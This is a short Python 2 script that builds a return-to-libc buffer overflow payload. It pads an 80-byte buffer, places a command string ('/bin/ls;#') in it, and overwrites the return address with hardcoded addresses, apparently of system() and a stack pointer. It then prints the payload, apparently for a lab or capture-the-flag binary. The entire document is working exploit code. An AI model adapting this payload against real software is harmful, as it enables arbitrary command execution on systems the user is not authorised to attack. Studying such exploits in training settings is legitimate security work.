#!/usr/bin/python

#use ret2libc to call system() with the address of the buffer as the arg
# system() takes a string arg, so we pass that into our buffer as needed
offset = 80

cmd = "/bin/ls;#"

junk = "A" * (offset - len(cmd))

# system() address
ret1 = "\xb0\xff\xec\xb7"
ret2 = "\xc0\x60\xec\xb7"

arg1 = "\x5c\xfc\xff\xbf"
arg2 = "\xf0\xff\xff\xff"

payload = cmd + junk + ret1 + ret2 + arg1 + arg2
print payload